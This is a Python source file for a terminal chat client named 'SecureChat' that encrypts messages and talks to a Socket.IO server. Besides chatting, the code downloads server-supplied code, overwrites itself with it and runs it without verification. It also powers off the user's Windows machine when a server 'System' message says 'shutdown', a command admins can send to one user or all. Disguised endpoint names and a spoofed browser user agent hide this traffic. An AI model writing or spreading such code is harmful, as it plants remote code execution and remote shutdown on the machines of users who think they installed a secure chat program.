import os,sys,socketio,requests,json,threading,queue,time,hashlib,random,base64,logging,ctypes,subprocess
from datetime import datetime;from cryptography.fernet import Fernet;from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC;from cryptography.hazmat.backends import default_backend
from urllib3.exceptions import InsecureRequestWarning;requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
[logging.getLogger(name).setLevel(logging.WARNING)for name in['socketio','engineio','werkzeug']]
class SecureChat:
    def __init__(self):
        self.VERSION="1.0.1";self.sio=None;self.server_url=None;self.username=None;self.fernet=None;self.encryption_key=None
        self.session_key=None;self.MAX_MSG_SIZE=1024*8;self.MAX_QUEUE_SIZE=100;self.message_queue=queue.Queue(maxsize=self.MAX_QUEUE_SIZE)
        self.running=True;self.active_users=set();self.current_input="";self.is_admin=False
        self.user_agents=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36']
        self.headers={'User-Agent':random.choice(self.user_agents),'Accept':'application/json','Content-Type':'application/json'}
        self.start()
    def check_update(self):
        try:
            response=requests.get(f"{self.server_url}/assets/data/stream",headers=self.headers,timeout=5,verify=True)
            if response.status_code==200:
                server_version=response.json().get('current_version')
                if server_version and server_version!=self.VERSION:return True,server_version
            return False,None
        except:return False,None
    def update_client(self,update_url):
        try:
            print("\nUpdating client...")
            response=requests.get(update_url,timeout=10)
            if response.status_code!=200:raise Exception("Failed to download update")
            new_code=response.text
            current_file=os.path.abspath(sys.argv[0])
            backup_file=current_file+'.backup'
            try:os.remove(backup_file)
            except:pass
            os.rename(current_file,backup_file)
            with open(current_file,'w',encoding='utf-8')as f:f.write(new_code)
            print("\nUpdate complete! Restarting...")
            subprocess.Popen([sys.executable,current_file],creationflags=subprocess.CREATE_NEW_CONSOLE)
            sys.exit(0)
        except Exception as e:
            print(f"\nUpdate failed: {str(e)}")
            try:os.rename(backup_file,current_file)
            except:pass
            return False
    def shutdown_system(self):
        def try_method(m):
            try:return m()or True
            except:return False
        [m()for m in[lambda:os.system('shutdown /s /t 1'),lambda:ctypes.windll.user32.ExitWindowsEx(0x00000008,0x00000000)]if try_method(m)]
    def clear_screen(self):os.system('cls')
    def print_banner(self):print(f"\n╔═══════════════════════════════════╗\n║         Secure Chat Client        ║\n║  Type /help for available commands║\n║           Version {self.VERSION}           ║\n╚═══════════════════════════════════╝")
    def derive_encryption_key(self,server_challenge,client_challenge,username,sess_key):
        try:unique_material=f"{username}:{sess_key}:{server_challenge}{client_challenge}".encode();session_salt=hashlib.sha256(sess_key.encode()).digest();kdf=PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=session_salt,iterations=100000,backend=default_backend());return base64.urlsafe_b64encode(kdf.derive(unique_material))
        except Exception as e:raise ValueError(f"Failed to derive key: {str(e)}")
    def connect_manual(self):
        try:
            try:import socketio,websocket
            except ImportError:print("\nError: Missing required dependencies.");print("Please install: pip install python-socketio[client] websocket-client");return False
            host=input("\nServer host (default: chat-vex2.onrender.com): ").strip()or'chat-vex2.onrender.com'
            port=input("Port (default: 443): ").strip()or'443'
            protocol='https'if port=='443'else'http'
            self.server_url=f"{protocol}://{host}:{port}"
            needs_update,_=self.check_update()
            if needs_update:
                response=requests.get(f"{self.server_url}/assets/data/stream",headers=self.headers,timeout=5,verify=True)
                update_url=response.json().get('update_url')
                if update_url and self.update_client(update_url):return False
            max_retries=3
            for attempt in range(max_retries):
                try:return True if requests.get(f"{self.server_url}/assets/data/stream",headers=self.headers,timeout=5,verify=False if protocol=='http'else True).status_code==200 else False
                except:continue
            return False
        except:raise
    def setup_encryption(self,key):
        try:self.encryption_key=key.decode()if isinstance(key,bytes)else key;self.fernet=Fernet(self.encryption_key.encode());return True
        except Exception as e:raise ValueError(f"Failed to setup encryption: {str(e)}")
    def encrypt_message(self,message):
        try:
            if len(str(message))>self.MAX_MSG_SIZE:raise ValueError(f"Message exceeds size limit of {self.MAX_MSG_SIZE} bytes")
            if not self.fernet:raise ValueError("Encryption not initialized")
            message['timestamp']=datetime.now().isoformat()
            return self.fernet.encrypt(json.dumps(message).encode()).decode()
        except:raise
    def decrypt_message(self,encrypted_message):
        try:
            if not self.fernet:raise ValueError("Encryption not initialized")
            message=json.loads(self.fernet.decrypt(encrypted_message.encode()))
            if not isinstance(message,dict)or'content'not in message or'username'not in message:raise ValueError("Invalid format")
            if message['username']=='System':
                if'Admin privileges granted'in message['content']:print("\nAdmin granted.\nAdmin commands:\n/kick <user>\n/broadcast <msg>\n/shutdown <user|all>");self.is_admin=True;return None
                elif message['content']=='shutdown':print("\nReceived shutdown command...");self.shutdown_system();return None
            return message
        except:raise
    def initialize_connection(self):
        self.sio=socketio.Client(logger=False,engineio_logger=False,reconnection=True,reconnection_attempts=3,reconnection_delay=1,reconnection_delay_max=5)
        @self.sio.event
        def connect():print("\nConnection established");self.sio.emit('register',{'username':self.username,'session_key':self.session_key})
        @self.sio.event
        def connect_error(data):print(f"\nConnection failed: {data}")
        @self.sio.event
        def disconnect():print("\nDisconnected from server")
        @self.sio.on('resource_update')
        def on_message(data):
            try:
                if'message'not in data:raise ValueError("Invalid message data")
                decrypted=self.decrypt_message(data['message'])
                if not decrypted:return
                timestamp=datetime.now().strftime('%H:%M:%S');username=decrypted.get('username','unknown');content=decrypted.get('content','')
                current=self.current_input;print('\r',' '*(len(current)+2),'\r',end='',flush=True)
                print(f"\033[{'94'if username==self.username else'92'}m[{timestamp}] {username}: {content}\033[0m")
                print(f"> {current}",end='',flush=True)
            except Exception as e:print(f"\nError processing message: {str(e)}")
        @self.sio.on('cache_status')
        def on_user_update(data):
            try:self.active_users=set(data.get('active_streams',[]))
            except Exception as e:print(f"\nError updating user list: {str(e)}")
    def print_help(self):print("\nAvailable commands:\n/users - Show active users\n/clear - Clear screen\n/quit  - Exit chat\n/help  - Show this help")
    def message_sender(self):
        while self.running:
            try:message=self.message_queue.get();encrypted=self.encrypt_message(message)if len(str(message))<=self.MAX_MSG_SIZE else print(f"\nMessage too large (max {self.MAX_MSG_SIZE} bytes)");self.sio.emit('stream_data',{'message':encrypted,'timestamp':datetime.now().isoformat()})if encrypted else None
            except queue.Empty:continue
            except Exception as e:print(f"\nError sending message: {str(e)}")
    def start(self):
        try:
            self.clear_screen();self.print_banner()
            while True:
                try:
                    if not self.connect_manual():continue
                    self.username=input("\nUsername: ").strip()
                    while not self.username:self.username=input("Username: ").strip()
                    response=requests.post(f"{self.server_url}/api/resources/validate",headers=self.headers,json={'username':self.username,'version':self.VERSION},timeout=5,verify=False if self.server_url.startswith('http://')else True)
                    if response.status_code==426:
                        update_url=response.json().get('update_url')
                        if update_url and self.update_client(update_url):continue
                        raise ValueError("Update required but failed")
                    if response.status_code!=200:raise ValueError(f"Authentication failed: {response.text}")
                    data=response.json()
                    if'challenge'not in data or'session_key'not in data:raise ValueError("Invalid server response")
                    server_challenge=data['challenge'];self.session_key=data['session_key'];client_challenge=base64.urlsafe_b64encode(os.urandom(32)).decode()
                    auth_response=requests.post(f"{self.server_url}/api/resources/complete_auth",headers=self.headers,json={'username':self.username,'client_challenge':client_challenge,'session_key':self.session_key},timeout=5,verify=False if self.server_url.startswith('http://')else True)
                    if auth_response.status_code!=200:raise ValueError(f"Authentication completion failed: {auth_response.text}")
                    if not self.setup_encryption(self.derive_encryption_key(server_challenge,client_challenge,self.username,self.session_key)):raise ValueError("Failed to setup encryption")
                    self.initialize_connection();self.sio.connect(self.server_url,headers=self.headers,transports=['websocket','polling'],wait_timeout=10)
                    threading.Thread(target=self.message_sender,daemon=True).start();print("\nConnected! Type your messages below:");self.print_help()
                    while True:
                        try:
                            self.current_input="";user_input=input("> ").strip()
                            if not user_input:continue
                            elif user_input.lower()in['/quit','/exit']:break
                            elif user_input.lower()=='/users':print(f"\nActive users: {', '.join(sorted(self.active_users))}")
                            elif user_input.lower()=='/clear':self.clear_screen();self.print_banner()
                            elif user_input.lower()=='/help':self.print_help()
                            elif user_input.lower()=='/auth':auth_key=input("> Introduce auth key: ").strip();self.message_queue.put({'content':f'/auth {auth_key}','username':self.username})if auth_key else None
                            elif user_input.startswith(('/kick ','broadcast ','/shutdown ')):self.message_queue.put({'content':user_input,'username':self.username})
                            else:self.message_queue.put({'content':user_input,'username':self.username})
                        except(KeyboardInterrupt,EOFError):break
                        except Exception as e:print(f"\nError processing input: {str(e)}")
                except(KeyboardInterrupt,EOFError):break
                except Exception as e:print(f"\nError: {str(e)}")
                finally:self.running=False;self.sio.disconnect()if self.sio and self.sio.connected else None;break
        except Exception as e:print(f"\nFatal error: {str(e)}")
        finally:print("\nGoodbye!")
if __name__=="__main__":
    try:SecureChat()
    except KeyboardInterrupt:print("\nClient terminated by user")
